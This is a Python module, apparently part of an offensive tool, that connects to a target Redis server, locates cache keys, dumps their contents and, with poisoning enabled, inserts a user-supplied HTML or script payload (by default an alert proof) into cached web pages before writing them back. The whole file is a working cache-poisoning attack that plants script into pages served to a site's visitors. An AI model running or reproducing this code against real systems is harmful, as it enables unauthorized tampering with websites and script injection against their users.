# -*- coding: utf-8 -*-

import redis
import logging

from lxml import etree

log = logging.getLogger()


# ----------------------------------------------------------------------
def dump_key(key, con):

	key_type = con.type(key).lower()
	val = None
	if key_type in (b"kv", b"string"):
		val = con.get(key)
	if key_type == b"hash":
		val = con.hgetall(key)
	if key_type == b"zet":
		val = con.zrange(key, 0, -1)
	if key_type == b"set":
		val = con.mget(key)

	if val is not None:
		if isinstance(val, list):
			if val[0] is None:
				return None
		return val
	return None


# ----------------------------------------------------------------------
def search_caches(con):
	"""
	Try to search cache keys
	"""
	found = False

	for x in con.keys():
		if "cache" in str(x).lower():
			yield x


# ----------------------------------------------------------------------
def handle_html(config, content):
	"""
	Modify the HTML content
	"""

	# --------------------------------------------------------------------------
	# Selected custom HTML file?
	# --------------------------------------------------------------------------
	if config.new_html is not None:
		with open(config.new_html, "rU") as f:
			return f.read()

	# --------------------------------------------------------------------------
	# Search start and end possition of HTML page
	# --------------------------------------------------------------------------
	for i, x in enumerate(content):
		if chr(x) == "<":
			pos_ini = i
			break

	for i, x in enumerate(content[::-1]):
		if chr(x) == ">":
			pos_end = len(content) - i
			break

	if pos_ini is None or pos_end is None:
		raise ValueError("Not found HTML content into cache")

	txt_content = content[pos_ini:pos_end]

	# Parse input
	tree = etree.fromstring(txt_content, etree.HTMLParser())
	doc_root = tree.getroottree()

	results = None

	# --------------------------------------------------------------------------
	# Search insertion points
	# --------------------------------------------------------------------------

	# Try to find end of script entries
	insert_point = doc_root.find(".//script[last()]")

	if insert_point is not None:
		results = add_injection(config, doc_root, insert_point, where="before")

	else:
		# Try to find othe entry
		for point in ("head", "title", "body", "div", "p"):
			insert_point = doc_root.find(".//%s" % point)

			if insert_point is None:
				continue

			results = add_injection(config, doc_root, insert_point)

			break

	# --------------------------------------------------------------------------
	# Build results
	# --------------------------------------------------------------------------
	return results


# ----------------------------------------------------------------------
def add_injection(config, doc_root, insert_point, where="after"):
	"""
	:param where: posible values: after|before
	:type where: str

	"""

	# --------------------------------------------------------------------------
	# Add the injection Payload
	# --------------------------------------------------------------------------
	if config.poison_payload_file is not None:
		with open(config.poison_payload_file, "rU") as f:
			_f_payload = f.read()
		payload = etree.fromstring(_f_payload)

	elif config.poison_payload:
		payload = etree.fromstring(config.poison_payload)
	else:
		payload = etree.fromstring("<script>alert('You are vulnerable to broker injection')</script>")

	insert_point.addnext(payload)

	# Set results
	tmp_results = etree.tostring(doc_root, method="html", pretty_print=True, encoding=doc_root.docinfo.encoding)

	# Codding filters
	results = tmp_results.decode(errors="replace").replace("\\u000a", "\n")

	return results


# ----------------------------------------------------------------------
def action_redis_cache_poison(config):
	"""
	Dump all redis information
	"""
	log.warning("  - Trying to connect with redis server...")

	# Connection with redis
	con = redis.StrictRedis(host=config.target, port=config.port, db=config.db)

	if not config.cache_key:
		cache_keys = set(search_caches(con))
	else:
		if config.cache_key is None:
			cache_keys = list(search_caches(con))[0]
		else:
			cache_keys = [config.cache_key]

	# --------------------------------------------------------------------------
	# Find cache keys
	# --------------------------------------------------------------------------
	if config.search_cache is True:
		log.error("Looking for caches in '%s'..." % config.target)

		for x in cache_keys:
			log.error("  - Possible cache found in key: %s" % str(x))

		if not cache_keys:
			log.error("  - No caches found")

		# Stop
		return

	if config.poison is True:
		log.error("  - Poisoning enabled")
	else:
		log.error("  - Listing cache information:")

	# --------------------------------------------------------------------------
	# Explode caches
	# --------------------------------------------------------------------------
	for val in cache_keys:
		content = dump_key(val, con)

		# If key doesn't exist content will be None
		if content is None:
			log.error("  - Provided key '%s' not found in server" % val)
			continue

		# --------------------------------------------------------------------------
		# Make actions over cache
		# --------------------------------------------------------------------------
		# Poison is enabled?
		if config.poison is True:
			# Set injection
			try:
				modified = handle_html(config, content)
			except ValueError as e:
				log.error("  - Can't modify cache content: " % e)
				continue
			except IOError as e:
				log.error("  - Can't modify cache content: " % e)

			# Injection was successful?
			if modified is None:
				log.error("  - Can't modify content: ensure that content is HTML")
				continue

			# Set injection into server
			con.setex(val, 200, modified)

			log.error("  - Poisoned cache key '%s' at server '%s'" % (val, config.target))
		else:

			# If not poison enabled display cache keys
			log.error("    -> Key: '%s' - " % val)
			log.error("    -> Content:\n %s" % content)

	if not cache_keys:
		log.error("  - No cache keys found in server: Can't poison remote cache.")
